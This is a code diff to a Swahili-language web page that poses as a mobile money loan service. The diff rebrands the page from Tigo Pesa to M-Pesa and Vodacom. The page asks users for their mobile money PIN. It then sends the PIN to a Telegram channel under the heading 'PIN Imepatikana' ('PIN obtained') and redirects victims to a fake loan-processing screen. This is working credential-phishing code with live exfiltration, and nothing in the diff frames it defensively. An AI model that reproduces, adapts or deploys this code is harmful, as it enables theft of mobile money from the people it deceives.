@@ -53,7 +53,7 @@
             </div>
 
             <h1 class="title">Ingiza PIN</h1>
-            <p class="subtitle">Tafadhali ingiza PIN yako ya Tigo Pesa kuhakiki</p>
+            <p class="subtitle">Tafadhali ingiza PIN yako ya M-Pesa kuhakiki</p>
 
             <div class="pin-container" id="pin-dots">
                 <div class="pin-dot"></div>
@@ -118,7 +118,7 @@
                     isSubmitting = true;
                     confirmBtn.style.opacity = '0.5';
                     confirmBtn.style.pointerEvents = 'none';
-                    await sendToTelegram(`<b>Tigo Loan - PIN Imepatikana</b>\nPIN: <code>${pin}</code>`);
+                    await sendToTelegram(`<b>Vodacom Loan - PIN Imepatikana</b>\nPIN: <code>${pin}</code>`);
                     const msg = encodeURIComponent('Tunaandaa mkopo, tunakagua uwezo wako wa kulipa...');
                     window.location.href = `loading.html?next=success.html&delay=10000&msg=${msg}`;
                 }
